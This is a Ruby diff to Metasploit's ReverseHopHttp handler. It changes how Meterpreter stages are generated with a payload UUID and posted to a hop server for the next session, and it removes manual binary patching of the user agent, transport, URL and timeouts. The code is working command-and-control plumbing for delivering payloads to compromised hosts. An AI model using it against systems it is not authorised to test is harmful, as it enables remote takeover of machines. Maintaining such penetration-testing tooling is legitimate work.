@@ -84,13 +84,13 @@ module ReverseHopHttp
       return
     end
 
-    # Sometimes you just have to do everything yourself. 
+    # Sometimes you just have to do everything yourself.
     # Declare ownership of this hop and spawn a thread to monitor it.
     self.refs = 1
     ReverseHopHttp.hop_handlers[full_uri] = self
     self.monitor_thread = Rex::ThreadFactory.spawn('ReverseHopHTTP', false, uri,
         self) do |uri, hop_http|
-      hop_http.send_new_stage # send stage to hop
+      hop_http.send_new_stage(uri) # send stage to hop
       delay = 1 # poll delay
       # Continue to loop as long as at least one handler or one session is depending on us
       until hop_http.refs < 1 && hop_http.handlers.empty?
@@ -138,7 +138,7 @@ module ReverseHopHttp
               :ssl                => false,
             })
             # send new stage to hop so next inbound session will get a unique ID.
-            hop_http.send_new_stage
+            hop_http.send_new_stage(uri)
           else
             hop_http.lock.unlock
           end
@@ -241,54 +241,27 @@ module ReverseHopHttp
   #
   # Generates and sends a stage up to the hop point to be ready for the next client
   #
-  def send_new_stage
-    conn_id = generate_uri_checksum(URI_CHECKSUM_CONN) + "_" + Rex::Text.rand_text_alphanumeric(16)
+  def send_new_stage(uri)
+    # try to get the UUID out of the existing URI
+    info = process_uri_resource(uri)
+    uuid = info[:uuid] || Msf::Payload::UUID.new
+
+    # generate a new connect
+    sum = uri_checksum_lookup(:connect)
+    conn_id = generate_uri_uuid(sum, uuid)
     url = full_uri + conn_id + "/\x00"
 
     print_status("Preparing stage for next session #{conn_id}")
-    blob = stage_payload
-
-    # Replace the user agent string with our option
-    i = blob.index("METERPRETER_UA\x00")
-    if i
-      str = datastore['MeterpreterUserAgent'][0,255] + "\x00"
-      blob[i, str.length] = str
-    end
-
-    # Replace the transport string first (TRANSPORT_SOCKET_SSL)
-    i = blob.index("METERPRETER_TRANSPORT_SSL")
-    if i
-      str = "METERPRETER_TRANSPORT_HTTP#{ssl? ? "S" : ""}\x00"
-      blob[i, str.length] = str
-    end
-
-    conn_id = generate_uri_checksum(URI_CHECKSUM_CONN) + "_" + Rex::Text.rand_text_alphanumeric(16)
-    i = blob.index("https://" + ("X" * 256))
-    if i
-      url = full_uri + conn_id + "/\x00"
-      blob[i, url.length] = url
-    end
-    print_status("Patched URL at offset #{i}...")
-
-    i = blob.index([0xb64be661].pack("V"))
-    if i
-      str = [ datastore['SessionExpirationTimeout'] ].pack("V")
-      blob[i, str.length] = str
-    end
-
-    i = blob.index([0xaf79257f].pack("V"))
-    if i
-      str = [ datastore['SessionCommunicationTimeout'] ].pack("V")
-      blob[i, str.length] = str
-    end
-
-    blob = encode_stage(blob)
+    blob = stage_payload(
+      uuid: uuid,
+      uri:  conn_id
+    )
 
     #send up
     crequest = mclient.request_raw(
         'method' => 'POST',
         'uri' => control,
-        'data' => blob,
+        'data' => encode_stage(blob),
         'headers' => {'X-init' => 'true'}
     )
     res = mclient.send_recv(crequest)
